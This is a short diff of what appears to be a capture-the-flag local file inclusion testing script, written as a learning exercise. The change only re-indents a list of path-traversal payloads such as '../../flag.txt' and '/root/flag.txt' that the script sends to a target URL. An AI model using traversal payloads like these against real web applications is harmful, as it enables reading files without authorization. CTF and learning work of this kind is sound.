@@ -18,17 +18,17 @@ def print_banner():
 """)
 
 def test_lfi(url, param, prefix):
-# Common flag paths - aaj wala lesson
-flag_paths = [
-"flag", "flag.txt",
-"../flag", "../flag.txt",
-"../../flag", "../../flag.txt",
-"../../../flag", "../../../flag.txt",
-"../../../../flag", "../../../../flag.txt",
-"../../../../../flag", "../../../../../flag.txt",
-"/flag.txt", "/var/www/html/flag.txt",
-"/home/flag.txt", "/root/flag.txt"
-]
+    # Common flag paths - aaj wala lesson
+    flag_paths = [
+    "flag", "flag.txt",
+    "../flag", "../flag.txt",
+    "../../flag", "../../flag.txt",
+    "../../../flag", "../../../flag.txt",
+    "../../../../flag", "../../../../flag.txt",
+    "../../../../../flag", "../../../../../flag.txt",
+    "/flag.txt", "/var/www/html/flag.txt",
+    "/home/flag.txt", "/root/flag.txt"
+    ]
 
 print(f"{YELLOW}[*] Testing {len(flag_paths)*2} payloads on {url}{END}")
 
